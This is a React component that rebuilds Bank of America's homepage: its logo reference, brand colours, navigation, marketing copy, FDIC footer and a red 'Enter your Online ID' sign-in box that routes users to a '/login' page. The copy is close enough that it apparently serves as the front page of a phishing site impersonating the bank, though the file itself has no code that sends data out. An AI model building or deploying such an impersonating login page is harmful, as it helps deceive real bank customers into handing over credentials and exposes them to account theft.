import { Link, useNavigate } from "react-router-dom";
import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { Landmark, CreditCard, Send, Smartphone, Monitor, FileText, Bell, ArrowRight } from "lucide-react";

/** Inside/horizontal logo for the site */
const LOGO_URL = "/logo.png";

const Homepage = () => {
  const navigate = useNavigate();
  const [onlineId, setOnlineId] = useState("");
  const [passcode, setPasscode] = useState("");
  const [saveId, setSaveId] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");

  return (
    <div className="min-h-screen bg-white">
      {/* Top utility bar - gray */}
      <div className="bg-gray-100 border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-2">
          <div className="flex items-center justify-between text-sm">
            <div className="flex items-center gap-6">
              <a href="#" className="text-[#012169] hover:underline font-medium">Personal</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">Small Business</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">Wealth Management</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">Businesses & Institutions</a>
              <a href="#" className="text-[#012169] hover:underline font-medium">About Us</a>
            </div>
            <div className="flex items-center gap-4">
              <a href="#" className="text-[#012169] hover:underline">Locations</a>
              <a href="#" className="text-[#012169] hover:underline">Contact Us</a>
              <a href="#" className="text-[#012169] hover:underline">Help</a>
              <a href="#" className="text-[#012169] hover:underline">En español</a>
              <input
                type="text"
                placeholder="How can we help you?"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="border border-gray-300 rounded px-3 py-1.5 text-sm w-48"
              />
            </div>
          </div>
        </div>
      </div>

      {/* Main header - Logo + Sign-in */}
      <header className="bg-white border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-4">
          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-6">
            <Link to="/" className="flex-shrink-0">
              <img src={LOGO_URL} alt="Bank of America" className="h-10 object-contain" />
            </Link>
            <div className="flex-1 max-w-md">
              <div className="bg-[#E31837] text-white rounded-lg p-5">
                <h2 className="text-lg font-bold mb-4">Enter your Online ID</h2>
                <form className="space-y-3" onSubmit={(e) => { e.preventDefault(); navigate("/login"); }}>
                  <Input
                    type="text"
                    placeholder="Online ID"
                    value={onlineId}
                    onChange={(e) => setOnlineId(e.target.value)}
                    name="oid"
                    className="h-10 bg-white text-gray-900 border-0"
                  />
                  <div className="flex items-center gap-2">
                    <Checkbox
                      id="saveId"
                      checked={saveId}
                      onCheckedChange={(c) => setSaveId(!!c)}
                      className="border-white data-[state=checked]:bg-white data-[state=checked]:text-[#E31837]"
                    />
                    <label htmlFor="saveId" className="text-sm text-white/90">Save this Online ID</label>
                    <a href="#" className="text-sm text-white underline ml-auto">Help/options</a>
                  </div>
                  <Button type="submit" className="w-full bg-[#012169] hover:bg-[#011a52] text-white h-10">
                    Sign In
                  </Button>
                </form>
                <a href="#" className="text-sm text-white underline mt-2 inline-block">Enroll</a>
              </div>
            </div>
          </div>
          {/* Main nav tabs */}
          <nav className="flex gap-1 mt-6 border-b border-gray-200">
            {["Banking", "Credit Cards", "Loans", "Investments", "Learning"].map((tab) => (
              <a
                key={tab}
                href="#"
                className={`px-4 py-3 text-sm font-medium border-b-2 -mb-px transition-colors ${
                  tab === "Banking" ? "border-[#E31837] text-[#E31837]" : "border-transparent text-gray-600 hover:text-gray-900"
                }`}
              >
                {tab}
              </a>
            ))}
          </nav>
        </div>
      </header>

      {/* Hero - Open an account + Video */}
      <section className="bg-gray-50 border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8">
          <div className="flex flex-col lg:flex-row gap-8 items-center">
            <div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Open an account</h2>
              <p className="text-gray-600 mb-4">Checking, Savings, Credit Cards, Home Loans, Auto Loans, and more.</p>
              <div className="flex flex-wrap gap-3">
                <a href="#" className="text-[#012169] font-medium hover:underline">Checking</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Savings & CDs</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Credit Cards</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Home Loans</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Auto Loans</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Small Business</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Investing</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Get the free app</a>
                <a href="#" className="text-[#012169] font-medium hover:underline">Schedule an appointment</a>
              </div>
            </div>
            <div className="w-full lg:w-96 h-48 bg-gray-200 rounded-lg flex items-center justify-center text-gray-500">
              Video placeholder
            </div>
          </div>
        </div>
      </section>

      {/* Your financial goals matter */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Your financial goals matter</h2>
          <p className="text-gray-600 mb-8">
            We can help you achieve them through Better Money Habits® financial education and programs that make communities stronger.
          </p>
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              "Real Talk with Better Money Habits®",
              "8 common bank fees—and how to avoid them",
              "What is a certificate of deposit (CD) and how does it work?",
              "How to start building an emergency fund",
            ].map((title) => (
              <a
                key={title}
                href="#"
                className="block p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/40 hover:shadow-md transition-all group"
              >
                <span className="text-[#012169] font-medium group-hover:underline">{title}</span>
                <ArrowRight className="h-4 w-4 text-gray-400 mt-2 group-hover:text-[#E31837]" />
              </a>
            ))}
          </div>
          <a href="#" className="inline-block mt-6 text-[#012169] font-medium hover:underline">
            Visit Better Money Habits®
          </a>
        </div>
      </section>

      {/* Enroll in Online Banking - feature grid */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Enroll in Online Banking</h2>
          <Link to="/login">
            <Button type="button" className="bg-[#012169] hover:bg-[#011a52] text-white mb-8">Enroll now</Button>
          </Link>
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { icon: Monitor, title: "Access your accounts", desc: "Check all activity whenever you want." },
              { icon: FileText, title: "Pay bills", desc: "At your convenience from wherever you can connect." },
              { icon: Bell, title: "Set up alerts", desc: "Get activity info delivered by email or text." },
              { icon: Send, title: "Make transfers", desc: "Securely transfer funds between your accounts and to friends and family." },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="flex gap-4 p-4 bg-white border border-gray-200 rounded-lg">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <Icon className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900">{title}</h3>
                  <p className="text-sm text-gray-600 mt-1">{desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Your news and information */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-8">Your news and information</h2>
          <div className="grid sm:grid-cols-2 gap-6">
            <div className="border border-gray-200 rounded-lg p-6">
              <h3 className="font-semibold text-gray-900 mb-2">Level up your account security</h3>
              <p className="text-gray-600 text-sm mb-4">
                Watch your security meter rise as you take action to help protect against fraud. See it in the Security Center in Mobile and Online Banking.
              </p>
              <Link to="/login" className="text-[#012169] font-medium hover:underline">
                Check your account security level
              </Link>
            </div>
            <div className="border border-gray-200 rounded-lg p-6">
              <h3 className="font-semibold text-gray-900 mb-2">Convenient banking with our Mobile app</h3>
              <p className="text-gray-600 text-sm mb-4">
                Bank on the go with our secure mobile banking app.
              </p>
              <a href="#" className="text-[#012169] font-medium hover:underline">
                Explore our mobile app
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Connect with us */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-8">Connect with us</h2>
          <div className="flex flex-wrap gap-6">
            <a href="#" className="text-[#012169] font-medium hover:underline">Schedule an appointment</a>
            <a href="#" className="text-[#012169] font-medium hover:underline">Find a location</a>
            <a href="#" className="text-[#012169] font-medium hover:underline">Contact us</a>
            <a href="#" className="text-[#012169] font-medium hover:underline">Help center</a>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-white border-t border-gray-200 py-8 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex flex-wrap items-center justify-between gap-4 text-sm text-gray-600">
            <div className="flex flex-wrap gap-4">
              <a href="#" className="hover:text-[#E31837]">Privacy</a>
              <a href="#" className="hover:text-[#E31837]">Security</a>
              <a href="#" className="hover:text-[#E31837]">Advertising Practices</a>
            </div>
            <p>Bank of America, N.A. Member FDIC. Equal Housing Lender. © 2026 Bank of America Corporation.</p>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Homepage;
